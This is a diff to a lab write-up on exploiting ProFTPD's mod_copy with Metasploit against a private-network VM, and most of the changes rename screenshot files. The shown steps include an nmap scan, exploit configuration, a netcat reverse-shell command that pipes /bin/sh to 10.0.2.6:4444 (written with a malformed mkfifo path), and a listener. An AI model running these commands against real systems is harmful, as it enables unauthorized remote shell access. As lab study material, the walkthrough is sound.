@@ -145,28 +145,27 @@ sudo service proftpd restart
 ```bash
 nmap -sV 10.0.2.15
 ```
-![6-re-run-nmap.png](./screenshots/6-re-run-nmap.png)
+![1-nmap-scan.png](./screenshots/1-nmap-scan.png)
 
 ## Step 2: Relaunch Metasploit
 ```bash
 msfconsole
 ```
-![7-re-launch-msfconsole.png](./screenshots/7-re-launch-msfconsole.png)
+![2-launch-msfconsole.png](./screenshots/2-launch-msfconsole.png)
 
 ## Step 3: Search for mod_copy Again
 ```bash
 search mod_copy
 ```
-![8-search-modcopy-again.png](./screenshots/8-search-modcopy-again.png)
+![3-search-mod_copy.png](./screenshots/3-search-mod_copy.png)
 
 ## Step 4: Configure Exploit Again
 ```bash
-use exploit/unix/ftp/proftpd_modcopy_exec
 show options
 set RHOSTS 10.0.2.15
 set SITEPATH /var/www/html
 ```
-![9-set-rhosts-and-sitepath-again.png](./screenshots/9-set-rhosts-and-sitepath-again.png)
+![4-show-options-and-set-rhosts-sitepath.png](./screenshots/4-show-options-and-set-rhosts-sitepath.png)
 
 ## Step 5: Set Payload and Reverse Shell Command
 ```bash
@@ -176,26 +175,27 @@ show payload options
 set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
 set AllowNoCleanup true
 ```
-![10-show-payloads-error.png](./screenshots/10-show-payloads-error.png)
-![11-show-options-and-set-cmd.png](./screenshots/11-show-options-and-set-cmd.png)
+![5-show-payloads.png](./screenshots/5-show-payloads.png)
+![6-set-payload5.png](./screenshots/6-set-payload5.png)
+![7-set-cmd-and-allownocleanup.png](./screenshots/7-set-cmd-and-allownocleanup.png)
 
 ## Step 6: Start Netcat Listener Again
 ```bash
 nc -lnvp 4444
 ```
-![12-start-netcat-listener-again.png](./screenshots/12-start-netcat-listener-again.png)
+![8-start-netcat-listener.png](./screenshots/8-start-netcat-listener.png)
 
 ## Step 7: Run Exploit Again
 ```bash
 run
 ```
-![13-run-exploit-again-fails.png](./screenshots/13-run-exploit-again-fails.png)
+![9-run-exploit.png](./screenshots/9-run-exploit.png)
 
 ## Step 8: Attempt whoami - No Shell Access
 ```bash
 whoami
 ```
-![14-whoami-fails.png](./screenshots/14-whoami-fails.png)
+![10-whoami-no-shell.png](./screenshots/10-whoami-no-shell.png)
 
 ---
 
